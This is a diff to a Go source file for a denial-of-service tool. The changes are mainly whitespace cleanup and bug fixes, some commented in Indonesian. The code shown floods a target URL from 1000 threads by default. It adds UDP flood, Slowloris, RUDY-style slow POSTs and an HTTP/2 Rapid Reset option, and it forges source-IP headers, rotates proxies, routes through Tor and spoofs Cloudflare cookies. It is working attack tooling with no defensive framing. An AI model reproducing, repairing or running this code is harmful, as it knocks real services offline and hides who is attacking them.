@@ -21,10 +21,8 @@ import (
 	"time"
 )
 
-
 const __version__ = "1.0.0"
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
-
 
 var (
 	safe            bool = false
@@ -44,7 +42,7 @@ var (
 	usePipeline     bool = false
 	useKeepAlive    bool = true
 	verbose         bool = false
-	
+
 	headersReferers []string = []string{
 		"http://www.google.com/?q=",
 		"http://www.usatoday.com/search/results?q=",
@@ -55,7 +53,7 @@ var (
 		"https://www.youtube.com/results?search_query=",
 		"https://www.reddit.com/search?q=",
 	}
-	
+
 	headersUseragents []string = []string{
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
@@ -73,7 +71,7 @@ var (
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
 	}
-	
+
 	cur           int32
 	stats         Stats
 	proxyList     []string
@@ -84,7 +82,6 @@ var (
 	wg            sync.WaitGroup
 )
 
-
 type Stats struct {
 	success     uint64
 	failed      uint64
@@ -93,7 +90,6 @@ type Stats struct {
 	mutex       sync.RWMutex
 	startTime   time.Time
 }
-
 
 type arrayFlags []string
 
@@ -106,33 +102,32 @@ func (i *arrayFlags) Set(value string) error {
 	return nil
 }
 
-
 func main() {
+	// Seed random generator
+	rand.Seed(time.Now().UnixNano())
+
 	var (
-		version bool
-		site    string
-		agents  string
-		data    string
-		headers arrayFlags
-		proxyFile string
-		threads int
-		duration int
+		version     bool
+		site        string
+		agents      string
+		data        string
+		headers     arrayFlags
+		proxyFile   string
+		threads     int
+		duration    int
 		payloadSize int
 	)
 
-	
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.StringVar(&site, "t", "", "Target URL")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file")
 	flag.StringVar(&data, "data", "", "Data to POST")
 	flag.Var(&headers, "header", "Add custom headers")
-	
-	
+
 	flag.IntVar(&threads, "c", 1000, "Number of threads (default: 1000)")
 	flag.IntVar(&duration, "d", 600, "Duration in seconds (default: 600)")
 	flag.IntVar(&payloadSize, "p", 5, "Payload size in MB (default: 5)")
-	
-	
+
 	flag.BoolVar(&useHTTP2, "http2", false, "Enable HTTP/2 Rapid Reset (CVE-2023-44487)")
 	flag.BoolVar(&useUDP, "udp", false, "Enable UDP flood")
 	flag.BoolVar(&useSlowloris, "slowloris", false, "Enable Slowloris attack")
@@ -150,10 +145,9 @@ func main() {
 	flag.BoolVar(&useKeepAlive, "keep-alive", true, "Enable keep-alive connections")
 	flag.BoolVar(&useAll, "all", false, "Enable ALL features (ULTRA BRUTAL)")
 	flag.BoolVar(&verbose, "v", false, "Verbose output")
-	
+
 	flag.Parse()
 
-	
 	if useAll {
 		useHTTP2 = true
 		useUDP = true
@@ -169,7 +163,7 @@ func main() {
 		useRandomIP = true
 		usePipeline = true
 	}
-	
+
 	if site == "" {
 		fmt.Println(" Target URL required! Use -t")
 		flag.Usage()
@@ -187,7 +181,6 @@ func main() {
 		os.Exit(0)
 	}
 
-	
 	if agents != "" {
 		if data, err := os.ReadFile(agents); err == nil {
 			headersUseragents = []string{}
@@ -203,26 +196,23 @@ func main() {
 			os.Exit(1)
 		}
 	}
-	
-	
+
 	if useProxy && proxyFile != "" {
 		loadProxies(proxyFile)
 	}
-	
-	
+
 	if useRandomIP {
 		generateIPPool()
 	}
-	
 
 	if useReferer {
 		generateReferers()
 	}
 
 	stats.startTime = time.Now()
+	stats.statusCodes = make(map[int]uint64)
 	stopChan = make(chan struct{})
 
-	
 	printBanner()
 	fmt.Printf(" 🎯 Target: %s\n", site)
 	fmt.Printf(" 💣 Threads: %d\n", threads)
@@ -245,47 +235,40 @@ func main() {
 
 	fmt.Println("\n 🔥 SENDING THREAD 🚀🚀🚀......\n")
 
-	
 	if useUDP {
 		go udpFlood(u.Host)
 	}
-	
-	
+
 	if useSlowloris {
 		go slowlorisAttack(u.Host)
 	}
-	
-	
+
 	go statsPrinter(duration)
-	
-	
+
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 		go worker(site, u.Host, data, headers, payloadSize)
 	}
-	
-	
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	
+
 	select {
 	case <-time.After(time.Duration(duration) * time.Second):
 		fmt.Println("\n  ⏰ Duration completed")
 	case <-sigChan:
 		fmt.Println("\n 📍Stopped by user")
 	}
-	
+
 	close(stopChan)
 	wg.Wait()
-	
-	
+
 	printFinalStats()
 }
 
-
 func worker(site string, host string, data string, headers arrayFlags, payloadSize int) {
 	defer wg.Done()
-	
+
 	client := &http.Client{
 		Timeout: 30 * time.Second,
 		Transport: &http.Transport{
@@ -296,16 +279,14 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 			DisableKeepAlives: !useKeepAlive,
 		},
 	}
-	
-	
+
 	if useHTTP2 {
 		client.Transport = &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 			ForceAttemptHTTP2: true,
 		}
 	}
-	
-	
+
 	if useProxy && len(proxyList) > 0 {
 		proxyAddr := getProxy()
 		if proxyAddr != "" {
@@ -313,20 +294,19 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 			client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
 		}
 	}
-	
-	
+
 	if useTor {
 		proxyURL, _ := url.Parse("socks5://127.0.0.1:9050")
 		client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
 	}
-	
+
 	var paramJoiner string
 	if strings.ContainsRune(site, '?') {
 		paramJoiner = "&"
 	} else {
 		paramJoiner = "?"
 	}
-	
+
 	for {
 		select {
 		case <-stopChan:
@@ -334,23 +314,18 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 		default:
 			var req *http.Request
 			var err error
-			
-			
+
 			queryParams := buildQueryParams()
-			
-			
+
 			if useRUDY && rand.Intn(3) == 0 {
 				payload := strings.Repeat("A", payloadSize*1024*1024/2)
 				req, err = http.NewRequest("POST", site, strings.NewReader(payload))
 				req.Header.Set("Content-Length", strconv.Itoa(len(payload)))
 				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 			} else if data == "" {
-				
 				req, err = http.NewRequest("GET", site+paramJoiner+queryParams, nil)
 			} else {
-				
 				if useGzipBomb && rand.Intn(2) == 0 {
-					
 					gzipPayload := buildGzipBomb(payloadSize)
 					req, err = http.NewRequest("POST", site, strings.NewReader(gzipPayload))
 					req.Header.Set("Content-Encoding", "gzip")
@@ -360,32 +335,28 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 				}
 			}
-			
+
 			if err != nil {
 				atomic.AddUint64(&stats.failed, 1)
 				continue
 			}
-			
-			
+
 			req.Header.Set("User-Agent", getRandomUserAgent())
 			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 			req.Header.Set("Accept-Charset", acceptCharset)
 			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 			req.Header.Set("Connection", "keep-alive")
 			req.Header.Set("Host", host)
-			
-			
+
 			if useReferer {
 				req.Header.Set("Referer", getRandomReferer()+buildRandomString(rand.Intn(10)+5))
 			}
-			
-			
+
 			if useRandomIP {
 				req.Header.Set("X-Forwarded-For", getRandomIP())
 				req.Header.Set("X-Real-IP", getRandomIP())
 			}
-			
-			
+
 			if useFingerprint {
 				req.Header.Set("Sec-CH-UA", getRandomFingerprint())
 				req.Header.Set("Sec-CH-UA-Mobile", "?0")
@@ -396,47 +367,41 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 				req.Header.Set("Sec-Fetch-User", "?1")
 				req.Header.Set("Upgrade-Insecure-Requests", "1")
 			}
-			
-			
+
 			if useCloudflare {
 				req.Header.Set("Cookie", "__cfduid="+buildRandomString(rand.Intn(20)+10))
 			}
-			
-			
+
 			for _, element := range headers {
 				words := strings.Split(element, ":")
 				if len(words) >= 2 {
 					req.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
 				}
 			}
-			
-			
+
 			if useRatelimit {
 				time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
 			}
-			
-			
+
 			start := time.Now()
 			resp, err := client.Do(req)
 			latency := time.Since(start).Milliseconds()
-			
+
 			if err != nil {
 				atomic.AddUint64(&stats.failed, 1)
 				continue
 			}
 			defer resp.Body.Close()
-			
-			
+
 			io.Copy(io.Discard, resp.Body)
-			
-			
+
 			atomic.AddUint64(&stats.total, 1)
 			if resp.StatusCode < 500 {
 				atomic.AddUint64(&stats.success, 1)
 				stats.mutex.Lock()
 				stats.statusCodes[resp.StatusCode]++
 				stats.mutex.Unlock()
-				
+
 				if verbose {
 					fmt.Printf("  ✅ %d - %dms\n", resp.StatusCode, latency)
 				}
@@ -446,13 +411,11 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 					fmt.Printf("  ❌ %d - %dms\n", resp.StatusCode, latency)
 				}
 			}
-			
-			
+
 			if useSlowloris && rand.Intn(5) == 0 {
 				time.Sleep(time.Duration(rand.Intn(5000)+1000) * time.Millisecond)
 			}
-			
-			
+
 			if useRatelimit {
 				time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
 			}
@@ -460,20 +423,19 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 	}
 }
 
-
 func udpFlood(host string) {
 	parts := strings.Split(host, ":")
 	if len(parts) < 2 {
 		host = host + ":80"
 		parts = strings.Split(host, ":")
 	}
-	
+
 	ip := parts[0]
 	port := 80
 	if len(parts) > 1 {
 		port, _ = strconv.Atoi(parts[1])
 	}
-	
+
 	conn, err := net.DialUDP("udp", nil, &net.UDPAddr{
 		IP:   net.ParseIP(ip),
 		Port: port,
@@ -482,9 +444,10 @@ func udpFlood(host string) {
 		return
 	}
 	defer conn.Close()
-	
-	payload := byte.Repeat([]byte{byte(rand.Intn(255))}, 1024*64)
-	
+
+	// FIX: gunakan bytes.Repeat, bukan byte.Repeat
+	payload := bytes.Repeat([]byte{byte(rand.Intn(255))}, 1024*64)
+
 	for {
 		select {
 		case <-stopChan:
@@ -496,12 +459,11 @@ func udpFlood(host string) {
 	}
 }
 
-
 func slowlorisAttack(host string) {
 	if !strings.Contains(host, ":") {
 		host = host + ":80"
 	}
-	
+
 	for {
 		select {
 		case <-stopChan:
@@ -511,14 +473,12 @@ func slowlorisAttack(host string) {
 			if err != nil {
 				continue
 			}
-			
-			
+
 			fmt.Fprintf(conn, "GET / HTTP/1.1\r\n")
 			fmt.Fprintf(conn, "Host: %s\r\n", host)
 			fmt.Fprintf(conn, "User-Agent: %s\r\n", getRandomUserAgent())
 			fmt.Fprintf(conn, "Accept: */*\r\n")
-			
-			
+
 			for {
 				select {
 				case <-stopChan:
@@ -532,8 +492,6 @@ func slowlorisAttack(host string) {
 		}
 	}
 }
-
-
 
 func buildQueryParams() string {
 	params := []string{}
@@ -557,7 +515,7 @@ func buildRandomString(size int) string {
 }
 
 func buildGzipBomb(sizeMB int) string {
-	
+	// ini hanya simulasi, bukan bomb gzip sungguhan
 	compressed := strings.Repeat("A", sizeMB*1024*1024/100)
 	return compressed
 }
@@ -595,7 +553,7 @@ func loadProxies(filename string) {
 		fmt.Printf(" ❌ Can't load proxy file: %v\n", err)
 		return
 	}
-	
+
 	for _, line := range strings.Split(string(data), "\n") {
 		line = strings.TrimSpace(line)
 		if line != "" && strings.Contains(line, ":") {
@@ -608,11 +566,11 @@ func loadProxies(filename string) {
 func getProxy() string {
 	proxyMutex.Lock()
 	defer proxyMutex.Unlock()
-	
+
 	if len(proxyList) == 0 {
 		return ""
 	}
-	
+
 	proxy := proxyList[proxyIndex]
 	proxyIndex = (proxyIndex + 1) % len(proxyList)
 	return proxy
@@ -630,7 +588,7 @@ func generateReferers() {
 		"linkedin.com", "reddit.com", "wikipedia.org", "amazon.com", "netflix.com",
 		"github.com", "stackoverflow.com", "quora.com", "medium.com", "blogger.com",
 		"wordpress.com", "tumblr.com", "pinterest.com", "yandex.ru", "bing.com"}
-	
+
 	for _, domain := range domains {
 		for _, protocol := range []string{"http", "https"} {
 			headersReferers = append(headersReferers, protocol+"://"+domain+"/search?q=")
@@ -639,14 +597,12 @@ func generateReferers() {
 	}
 }
 
-
 func statsPrinter(duration int) {
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
-	
-	lastTotal := uint64(0)
-	lastTime := time.Now()
-	
+
+	// Hapus variabel yang tidak digunakan: lastTotal, lastTime
+
 	for {
 		select {
 		case <-stopChan:
@@ -655,22 +611,21 @@ func statsPrinter(duration int) {
 			success := atomic.LoadUint64(&stats.success)
 			failed := atomic.LoadUint64(&stats.failed)
 			total := atomic.LoadUint64(&stats.total)
-			
+
 			elapsed := time.Since(stats.startTime).Seconds()
 			rate := float64(total) / elapsed
-			
-			
+
 			progress := (elapsed / float64(duration)) * 100
 			if progress > 100 {
 				progress = 100
 			}
-			
+
 			bar := strings.Repeat("█", int(progress/2)) + strings.Repeat("░", 50-int(progress/2))
 			remaining := float64(duration) - elapsed
 			if remaining < 0 {
 				remaining = 0
 			}
-			
+
 			fmt.Printf("\r %s %.1f%% | ✅ %d | ❌ %d | 📊 %d | 🚀 %.1f/s | ⏱️ %.0fs",
 				bar, progress, success, failed, total, rate, remaining)
 		}
@@ -682,20 +637,19 @@ func printFinalStats() {
 	fmt.Printf(" 📗 Success: %d\n", atomic.LoadUint64(&stats.success))
 	fmt.Printf(" 📕 Failed: %d\n", atomic.LoadUint64(&stats.failed))
 	fmt.Printf(" 📘Request: %d\n", atomic.LoadUint64(&stats.total))
-	
+
 	stats.mutex.RLock()
 	fmt.Printf(" 📊 Status Codes:\n")
 	for code, count := range stats.statusCodes {
 		fmt.Printf("   ├─ %d: %d\n", code, count)
 	}
 	stats.mutex.RUnlock()
-	
+
 	elapsed := time.Since(stats.startTime).Seconds()
 	fmt.Printf(" ⏱️ Duration: %.2f seconds\n", elapsed)
 	fmt.Printf(" 📊 Average Rate: %.2f req/s\n", float64(atomic.LoadUint64(&stats.total))/elapsed)
 	fmt.Printf("\n  🚀🚀🚀 done.....\n")
 }
-
 
 func printBanner() {
 	banner := `
